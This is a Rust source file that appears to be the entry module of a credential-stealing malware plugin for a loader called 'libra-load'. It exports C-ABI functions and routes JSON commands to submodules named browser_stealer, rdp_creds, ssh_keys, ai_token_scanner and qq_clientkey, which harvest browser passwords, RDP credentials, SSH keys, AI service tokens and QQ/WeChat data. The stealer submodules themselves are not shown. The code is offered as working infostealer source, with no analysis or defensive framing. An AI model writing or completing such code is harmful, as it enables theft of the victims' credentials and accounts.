//! Credentials cloud module 鈥?browsers, RDP, SSH, AI tokens, QQ/WeChat.
#![allow(non_snake_case)]
#![allow(clippy::upper_case_acronyms)]

mod browser_stealer;
mod rdp_creds;
mod ssh_keys;
mod ai_token_scanner;
mod qq_clientkey;
mod other_software;

use serde_json::Value;

/// libra-load ABI entry point.
#[no_mangle]
pub extern "C" fn module_name() -> *const u8 {
    concat!("creds", "\0").as_ptr() as *const u8
}

#[no_mangle]
pub unsafe extern "system" fn module_main(
    input: *const u8,
    input_len: usize,
    output: *mut u8,
    output_cap: usize,
) -> usize {
    let input_json = if input.is_null() || input_len == 0 {
        "{}".to_string()
    } else {
        String::from_utf8_lossy(std::slice::from_raw_parts(input, input_len)).to_string()
    };
    let result = dispatch(&input_json);
    write_output(&result, output, output_cap)
}

fn dispatch(input: &str) -> String {
    let v: Value = serde_json::from_str(input).unwrap_or(Value::Object(Default::default()));
    let op = v.get("op").and_then(|o| o.as_str()).unwrap_or("");

    match op {
        "browser" => {
            let btype = v.get("type").and_then(|t| t.as_str()).unwrap_or("all");
            let offset = v.get("offset").and_then(|o| o.as_u64()).unwrap_or(0) as usize;
            let limit = v.get("limit").and_then(|l| l.as_u64()).unwrap_or(100) as usize;
            browser_stealer::BrowserStealer::collect(btype, offset, limit)
        }
        "browser_search" => {
            let btype = v.get("type").and_then(|t| t.as_str()).unwrap_or("all");
            let keyword = v.get("keyword").and_then(|k| k.as_str()).unwrap_or("");
            browser_stealer::BrowserStealer::search(btype, keyword)
        }
        "wechat" => other_software::OtherSoftware::collect_wechat(),
        "qq" => other_software::OtherSoftware::collect_qq(),
        "ai" => ai_token_scanner::AITokenScanner::scan(),
        "ssh" => ssh_keys::SshKeys::collect(),
        "rdp" => rdp_creds::RdpCreds::collect(),
        "qq_clientkey" => run_async(qq_clientkey::QQClientKey::collect()),
        _ => format!(r#"{{"error":"unknown creds op '{}'"}}"#, op),
    }
}

fn run_async<F: std::future::Future<Output = String>>(f: F) -> String {
    tokio::runtime::Builder::new_current_thread()
        .enable_all()
        .build()
        .map(|rt| rt.block_on(f))
        .unwrap_or_else(|e| format!(r#"{{"error":"runtime: {}"}}"#, e))
}

fn write_output(s: &str, output: *mut u8, output_cap: usize) -> usize {
    let bytes = s.as_bytes();
    let n = bytes.len().min(output_cap);
    if n > 0 && !output.is_null() {
        unsafe { std::ptr::copy_nonoverlapping(bytes.as_ptr(), output, n); }
    }
    n
}
